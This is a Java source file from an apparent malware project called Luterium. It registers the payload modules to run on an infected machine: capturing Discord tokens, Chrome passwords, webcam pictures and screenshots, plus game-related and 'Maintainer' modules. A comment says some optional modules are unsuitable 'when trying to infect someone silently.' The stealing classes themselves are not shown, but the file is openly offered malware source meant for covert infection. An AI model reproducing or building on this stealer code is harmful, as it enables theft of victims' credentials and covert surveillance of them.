package dev.peter.luterium.payload;

import dev.peter.luterium.features.*;
import dev.peter.luterium.features.maintainer.Maintainer;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

/**
 @author Peter
 @since 08/14/2022
 **/

public final class Payload {
    private static final Payload INSTANCE = new Payload();
    private final List<PayloadExecutor> payloads = new ArrayList<>(); //Payload list.

    private Payload() {
        payloads.addAll(Arrays.asList(
                new CSGO(),
                new Info(),
                new Minecraft(),
                new Maintainer(),
                new ScreenShot(),
                //new UsefulFiles(), //Check the class to know the reason it is commented - Peter 09/29/2025
                new Minecraft(),
                new WebcamPicture(),
                new DiscordTokens(),
                new ChromePassword()

                /*These are optional, not recommended when trying to infect someone silently.
                new PlaySong(),
                new FurryPorn(),
                new ChangeWallpaper()
                 */
        ));
    }
    public static List<PayloadExecutor> getPayloads()
    {
        return INSTANCE.payloads;
    }
}
